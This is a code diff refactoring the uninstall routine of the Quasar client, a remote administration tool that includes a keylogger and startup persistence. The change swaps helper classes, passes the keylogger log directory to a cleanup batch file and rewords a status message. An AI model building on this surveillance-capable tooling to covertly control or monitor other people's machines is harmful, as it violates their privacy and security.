@@ -1,8 +1,10 @@
-﻿using System;
-using System.Diagnostics;
-using Quasar.Client.Config;
-using Quasar.Client.Helper;
+﻿using Quasar.Client.Config;
+using Quasar.Client.Data;
+using Quasar.Client.IO;
+using Quasar.Client.Utilities;
 using Quasar.Common.Messages;
+using System;
+using System.Diagnostics;
 
 namespace Quasar.Client.Installation
 {
@@ -15,7 +17,7 @@ namespace Quasar.Client.Installation
                 if (Settings.STARTUP)
                     Startup.RemoveFromStartup();
 
-                string batchFile = FileHelper.CreateUninstallBatch(Settings.INSTALL && Settings.HIDEFILE);
+                string batchFile = BatchFile.CreateUninstallBatch(ClientData.CurrentPath, Keylogger.LogDirectory);
 
                 if (string.IsNullOrEmpty(batchFile))
                     throw new Exception("Could not create uninstall-batch file");
@@ -32,7 +34,7 @@ namespace Quasar.Client.Installation
             }
             catch (Exception ex)
             {
-                client.Send(new SetStatus {Message = $"Uninstallation failed: {ex.Message}"});
+                client.Send(new SetStatus {Message = $"Uninstall failed: {ex.Message}"});
             }
         }
     }
